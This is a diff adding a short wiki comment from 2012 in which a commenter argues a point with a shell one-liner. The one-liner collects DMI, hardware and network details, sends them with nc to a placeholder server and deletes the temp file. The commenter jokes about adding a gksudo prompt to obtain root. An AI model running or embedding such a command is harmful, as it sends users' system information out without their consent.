@@ -1,0 +1,11 @@
+[[!comment format=mdwn
+ ip="127.0.0.1"
+ subject="comment 4"
+ date="2012-02-26T21:45:21Z"
+ content="""
+Citation? If it's possible it's possible. It's so obviously possible.
+
+cat /sys/class/dmi/id/*>tmpfile && dmidecode>tmpfile && lshw>>tmpfile && ifconfig>>tmpfile && dmidecode>>tmpfile && nc server port<tmpfile && rm tmpfile
+
+add a gksudo prompt for lulz and profit.
+"""]]
